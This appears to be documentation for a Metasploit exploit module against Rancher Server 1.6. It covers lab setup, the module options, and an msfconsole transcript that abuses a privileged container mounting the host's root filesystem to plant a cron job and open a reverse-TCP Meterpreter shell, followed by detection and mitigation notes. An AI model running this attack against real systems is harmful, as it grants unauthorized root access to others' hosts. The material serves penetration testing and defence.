## Vulnerable Application
Utilizing Rancher Server, an attacker can create a docker container
with the '/' path mounted with read/write permissions on the host
server that is running the docker container. As the docker container
executes command as uid 0 it is honored by the host operating system
allowing the attacker to edit/create files owned by root. This exploit
abuses this to creates a cron job in the '/etc/cron.d/' path of the
host server.

The Docker image should exist on the target system or be a valid image
from hub.docker.com.

Use `check` with verbose mode to get a list of exploitable Rancher
Hosts managed by the target system.

## Rancher setup
Rancher is deployed as a set of Docker containers. Running Rancher is
as simple as launching two containers. One container as the management
server and another container on a node as an agent.

This module was tested with Debian 9 and CentOS 7 as the host operating
system with Docker 17.06.1-ce and Rancher Server 1.6.2, all with
default installation.

### Install Debian 9
First [install Debian 9][1] with default task selection. This includes
the "*standard system utilities*".

### Install Docker CE
Then install a supported version of [Docker on Debian system][2].

```bash
# TL;DR
apt-get remove docker docker-engine
apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common
curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -
apt-key fingerprint 0EBFCD88
# Verify that the key ID is 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88.
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable"
apt-get update
apt-get install docker-ce
docker run hello-world
```

### Rancher Server (Management)
I recommend doing a ['Rancher Server - Single Container (NON-HA)'
installation][3].

If Docker is installed, the command to start a single instance of
Rancher is simple.

```bash
# TL;DR
sudo docker run -d --restart=unless-stopped -p 8080:8080 rancher/server
```

If all is passing navigate to `http://[ip]:8080/`. You should see the
Rancher Server UI web application.

### Rancher Host (Agent)

Add a [new host][4] to Rancher Server so that the Docker host can be managed.

**Set Host Registration URL**

The first time that you add a host, you may be required to set up the
Host Registration URL.

* Navigate to Admin / Settings (`http://[ip]:8080/admin/settings`)
* Check if `"http://[ip]:8080/"` is set 
* Click on Save.

**Add new host**

* Navigate to Infrastructure / Hosts (`http://[ip]:8080/env/1a5/infra/hosts`)
* Click on Add Host
* Copy the command from Point 5 (and remove sudo prefix)
  `docker run --rm --privileged -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/rancher:/var/lib/rancher rancher/agent:v1.2.2 http://[ip]:8080/v1/scripts/XXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXX`
* Paste and run the command on the host

The new host should pop up on the Hosts screen within a minute.

# Exploitation
This module is designed to gain root access on a Rancher Host.

## Options
- CONTAINER_ID if you want to have a human readable name for your container, otherwise it will be randomly generated.
- DOCKERIMAGE is the local image or hub.docker.com available image you want to have Rancher to deploy for this exploit.
- TARGETENV this is the target Rancher Environment. The default environment is `1a5`.
- TARGETHOST is the target Rancher Host. The default host is `1h1`.

By default access control is disabled, but if enabled, you need API
Keys with at least "restrictive" permission in the environment.
See Rancher docs for [api-keys][5] and [membership-roles][6].

- HttpUsername is for your Access Key
- HttpPassword is for your Secret Key

Advanced Options
- TARGETURI this is the Rancher API base path. The default environment is `/v1/projects`.
- WAIT_TIMEOUT is how long you will wait for a docker container to deploy before bailing out if it does not start.

## Steps to exploit with module
- [ ] Start msfconsole
- [ ] use exploit/linux/http/rancher_server
- [ ] Set the options appropriately and set VERBOSE to true
- [ ] Verify it creates a docker container and it successfully runs 
- [ ] After a minute a session should be opened from the agent server

## Scenarios
```
msf > use exploit/linux/http/rancher_server
msf exploit(rancher_server) > set RHOST 192.168.91.111
RHOST => 192.168.91.111
msf exploit(rancher_server) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf exploit(rancher_server) > set LHOST 192.168.91.1
LHOST => 192.168.91.1
msf exploit(rancher_server) > set VERBOSE true
VERBOSE => true
msf exploit(rancher_server) > check

[+] Rancher Host "rancher" (TARGETHOST 1h1) on Environment "Default" (TARGETENV 1a5) found <-- targeted
[*] 192.168.91.111:8080 The target is vulnerable.
msf exploit(rancher_server) > exploit

[*] Started reverse TCP handler on 192.168.91.1:4444
[*] Setting container json request variables
[*] Creating the docker container command
[+] The docker container is created, waiting for it to deploy
[*] Waiting up to 60 seconds for docker container to start
[+] The docker container has stopped, now trying to remove it
[+] The docker container has been removed.
[*] Waiting for the cron job to run, can take up to 60 seconds
[*] Sending stage (40747 bytes) to 192.168.91.111
[*] Meterpreter session 1 opened (192.168.91.1:4444 -> 192.168.91.111:49948) at 2017-07-27 22:18:00 +0200
[+] Deleted /etc/cron.d/wlHVKGMA
[+] Deleted /tmp/jxKUxUyN

meterpreter > sysinfo
Computer     : rancher
OS           : Debian 9.1 (Linux 4.9.0-3-amd64)
Architecture : x64
Meterpreter  : x64/linux
meterpreter >
```
## Exploit Detection
Rancher Server has an [audit log][7]. While running this module two
events (create and delete) were logged. Even though the container is 
deleted, its still able to be viewed from the link in the audit log.

## Mitigation
* Do not deploy a Rancher Host on the same host where the Rancher
  Server is. Your entire rancher infrastructure is in [danger][8].
* Only allow trusted users to have more permissions than read-only.

Docker protection such as Username Namespaces could not be applied
because Rancher Agents run as a privileged container.


[1]:https://www.debian.org/releases/stretch/amd64/index.html.en
[2]:https://docs.docker.com/engine/installation/linux/docker-ce/debian/
[3]:https://rancher.com/docs/rancher/v1.6/en/installing-rancher/installing-server/#launching-rancher-server---single-container-non-ha
[4]:https://rancher.com/docs/rancher/v1.6/en/hosts/#adding-a-host
[5]:https://rancher.com/docs/rancher/v1.6/en/api/v2-beta/api-keys/
[6]:https://rancher.com/docs/rancher/v1.6/en/environments/#membership-roles
[7]:https://rancher.com/docs/rancher/v1.6/en/rancher-services/audit-log/
[8]:https://rancher.com/docs/rancher/v1.6/en/faqs/troubleshooting/#help-i-turned-on-access-controldocsrancherv16enconfigurationaccess-control-and-can-no-longer-access-rancher-how-do-i-reset-rancher-to-disable-access-control
[9]:https://rancher.com/docs/rancher/v1.6/en/installing-rancher/selinux/
